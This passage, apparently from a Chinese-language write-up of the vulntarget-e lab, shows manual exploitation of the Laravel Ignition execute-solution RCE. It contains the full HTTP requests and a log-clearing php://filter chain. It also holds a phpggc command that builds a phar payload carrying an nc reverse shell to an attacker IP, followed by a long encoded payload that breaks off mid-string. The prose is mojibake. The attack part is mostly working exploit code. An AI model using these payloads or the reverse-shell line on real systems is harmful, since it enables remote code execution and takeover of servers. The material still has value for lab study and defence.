ä¸ªpocéƒ½è¯•äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰æ‰“é€šï¼Œæ²¡æœ‰å…³ç³»ï¼Œæˆ‘ä»¬æ‰‹å·¥å¤ç°ä¸€ä¸‹ã€‚<br>å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« </p><p><code>https://www.freebuf.com/vuls/280508.html</code><br>å…·ä½“åŸç†è¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œç›´æ¥æ‰“</p><p>å…ˆè®¿é—®ç½‘ç«™ï¼ŒæŠ“åŒ…ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŒ…é‡Œæœ‰è®¸å¤šå†…å®¹ï¼ŒæŠŠä¸‹é¢çš„åˆ æ‰ï¼Œç„¶ååªç•™å››è¡Œ</p><p><img src="/images/vulntarget-e/image-20221129175857744.png" alt="image-20221129175857744"></p><p><img src="/images/vulntarget-e/image-20221129180059768.png" alt="image-20221129180059768"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>168</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;xxxxxxx&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°èƒ½å¤Ÿæ‰§è¡Œï¼Œ</p><p>ä¸‹è½½GitHubä¸Šä¸‹è½½çš„dockerç¯å¢ƒä¸­å¸¦æœ‰expï¼Œä½¿ç”¨æ­¤expéœ€è¦ä¸‹è½½phpggc</p><p><code>git clone https://github.com/ambionics/phpggc.git</code></p><p>æ”¹ä¸€ä¸‹777çš„æƒé™ï¼Œä¸‹é¢ç”Ÿæˆpocçš„æ—¶å€™ä¼šç”¨åˆ°</p><p>è¿™é‡Œæˆ‘ä»¬ç”Ÿæˆpocã€‚è¦åˆ°åˆšåˆšphpggcç›®å½•ä¸‹ï¼Œä¸Šé¢é‚£ç¯‡æ–‡ç« ä¸­å·²ç»æœ‰phpinfoäº†ï¼Œè·Ÿç€å¤ç°å°±è¡Œäº†ï¼Œäº²æµ‹phpinfoæ²¡æœ‰é—®é¢˜ã€‚å› ä¸ºæˆ‘ä¸Šé¢expè„šæœ¬éƒ½ä¸èƒ½ç”¨ï¼Œæ‰€ä»¥æƒ³ç€æœä¸€ä¸ªæ‰‹å·¥å¤ç°çš„æ‰“webshellçš„æ–¹æ³•ï¼Œå¥ˆä½•ç½‘ä¸Šçš„æ–¹æ³•éƒ½åªåˆ°phpinfoå°±ç»“æŸäº†ï¼Œå¹¶æ²¡æœ‰ç”Ÿæˆwebshellçš„ï¼Œå› ä¸ºè¿™é‡Œé¢æˆ‘ä»¬æ‰“ä¸€éphpinfoä¹‹åï¼Œæ—¥å¿—æ–‡ä»¶ä¼šé‡æ–°ç”Ÿæˆï¼ŒğŸå¹¶ä¸ä¼šç•™ç€æ—¥å¿—é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æœ‰ä¸€ä¸ªåå¼¹shellçš„æ–¹æ³•ï¼Œæˆ–è€…ç”Ÿæˆwebshellï¼Œç»è¿‡æµ‹è¯•ï¼Œå¤ªèœäº†ï¼Œfileputcontentæ²¡æœ‰æˆåŠŸï¼Œechoä¹Ÿæ²¡æœ‰æˆåŠŸï¼Œä½†æ˜¯æ²¡ç»™pocï¼Œæˆ‘ä»¬è‡ªå·±æ‰“ä¸€ä¸‹</p><p>è¿™é‡Œæ˜¯åå¼¹shellçš„ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php7.4 -d <span class="string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="string">&quot;system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.144.128 9999 &gt;/tmp/f&#x27;);phpinfo();&quot;</span> --phar phar -o php://output | base64 -w 0 | python -c <span class="string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129182228006.png" alt="image-20221129182228006"></p><p>ç”Ÿæˆä¸€ä¸²ç ï¼Œ</p><p>ä¸Šé¢å·²ç»è¯æ˜æ¼æ´å­˜åœ¨</p><p>ç„¶åbpå‘åŒ…ï¼Œæ¸…ç©ºæ—¥å¿—</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>328</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">![image-20221129201015519](/images/vulntarget-e/image-20221129201015519.png)</span><br><span class="line"></span><br><span class="line">å‘é€å¦‚ä¸‹æ•°æ®åŒ…ï¼Œç»™Logå¢åŠ ä¸€æ¬¡å‰ç¼€ï¼Œç”¨äºå¯¹é½ï¼š</span><br><span class="line"></span><br><span class="line">```http</span><br><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.144.55</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201219036.png" alt="image-20221129201219036"></p><p>å°†POCä½œä¸ºviewFileçš„å€¼ï¼Œå‘é€æ•°æ®åŒ…ï¼Œè¿™é‡Œæœ€åæœ‰ä¸ªaåˆ«å¿˜äº†ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5514</span><br><span class="line"></span><br><span class="line"><span class="dns">&#123;</span></span><br><span class="line"><span class="dns">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span></span><br><span class="line"><span class="dns">  &quot;parameters&quot;: &#123;</span></span><br><span class="line"><span class="dns">    &quot;variableName&quot;: &quot;username&quot;,</span></span><br><span class="line"><span class="dns">    &quot;viewFile&quot;: &quot;=<span class="number">50=00=44=00</span>=<span class="number">39=00=77=00</span>=<span class="number">61=00=48=00</span>=<span class="number">41=00=67=00</span>=<span class="number">58=00=31=00</span>=<span class="number">39=00=49=00</span>=<span class="number">51=00=55=00</span>=<span class="number">78=00=55=00</span>=<span class="number">58=00=30=00</span>=<span class="number">4</span>E=<span class="number">00=50=00=54</span>=<span class="number">00=56=00=42</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=54=00=45</span>=<span class="number">00=56=00=53</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=37=00=49</span>=<span class="number">00=44=00=38</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=44=00=51</span>=<span class="number">00=70=00=63</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=45=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=53</span>=<span class="number">00=57=00=78</span>=<span class="number">00=73=00=64</span>=<span class="number">00=57=00=31</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=46=00=30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=56=00=78</span>=<span class="number">00=43=00=63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=39=00=68</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=68=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=64=00=63</span>=<span class="number">00=55=00=47</span>=<span class="number">00=56=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=79=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=43</span>=<span class="number">00=49=00=36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=75</span>=<span class="number">00=64=00=48</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=73=00=62</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=58=00=45</span>=<span class="number">00=52=00=70</span>=<span class="number">00=63=00=33</span>=<span class="number">00=42=00=68</span>=<span class="number">00=64=00=47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=59</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00=48=00=46</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=56</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00=78=00=32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=45</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=76</span>=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=54</span>=<span class="number">00=47=00=39</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=56</span>=<span class="number">00=79=00=58</span>=<span class="number">00=45=00=56</span>=<span class="number">00=32=00=59</span>=<span class="number">00=57=00=78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00=31=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=73=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=39</span>=<span class="number">00=66=00=58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=51=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=67=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=73=00=62</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=76=00=59</span>=<span class="number">00=57=00=52</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=59=00=58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=58=00=45</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=79=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=45</span>=<span class="number">00=56=00=32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=57=00=35</span>=<span class="number">00=30=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00=35=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=39</span>=<span class="number">00=75=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=50</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=35=00=58</span>=<span class="number">00=45=00=64</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=59=00=58</span>=<span class="number">00=52=00=76</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=72=00=52</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=35=00=70</span>=<span class="number">00=64=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=76=00=62</span>=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=63=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=76</span>=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=52</span>=<span class="number">00=32=00=56</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=39</span>=<span class="number">00=79=00=58</span>=<span class="number">00=45=00=31</span>=<span class="number">00=76=00=59</span>=<span class="number">00=32=00=74</span>=<span class="number">00=44=00=62</span>=<span class="number">00=32=00=35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=64=00=31</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=46=00=30</span>=<span class="number">00=61=00=57</span>=<span class="number">00=39=00=75</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=63=00=36</span>=<span class="number">00=49=00=67</span>=<span class="number">00=41=00=71</span>=<span class="number">00=41=00=47</span>=<span class="number">00=35=00=68</span>=<span class="number">00=62=00=57</span>=<span class="number">00=55=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=59</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=79=00=49</span>=<span class="number">00=37=00=66</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00=32=00=39</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=53=00=49</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=67</span>=<span class="number">00=36=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00=63=00=47</span>=<span class="number">00=68=00=77</span>=<span class="number">00=49=00=48</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=35=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=62=00=53</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span 